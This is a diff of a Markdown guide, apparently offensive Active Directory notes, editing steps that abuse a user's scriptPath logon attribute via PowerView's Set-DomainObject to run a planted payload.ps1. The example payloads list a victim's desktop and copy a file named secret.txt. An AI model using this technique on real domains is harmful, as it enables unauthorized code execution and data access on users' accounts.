@@ -43,25 +43,25 @@ Prepare a script to perform the desired action. Save it in a location accessible
 - **Example 1**: List directory contents
     
     ```cmd
-    echo "dir C:\Users\Alice\Desktop > C:\Temp\output.txt" > \\fileserver\share\payload.ps1
+    echo "dir C:\Users\Alice\Desktop > C:\Temp\output.txt" > \\temp\\payload.ps1
     ```
   #### 2. **Set the `scriptPath` Attribute**
 
 Use PowerView or another AD tool to modify the `scriptPath` of the target user object.
 
     ```powershell
-    Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\payload.ps1" }
+    Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\\payload.ps1" }
     ```
   
 - **Example 2**: Copy a file
     
     ```cmd
-    echo "copy C:\Users\Alice\Desktop\secret.txt C:\Temp\copied_secret.txt" > \\fileserver\share\payload.ps1
+    echo "copy C:\Users\Alice\Desktop\secret.txt C:\Temp\copied_secret.txt" > \\temp\\payload.ps1
     ```
 **Set the `scriptPath` Attribute**
 
     ```powershell
-    Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\payload.ps1" }
+    Set-DomainObject -Identity alice -Set @{ scriptPath = "\\temp\\payload.ps1" }
     ```
 #### 3. **Retrieve the Results**
 
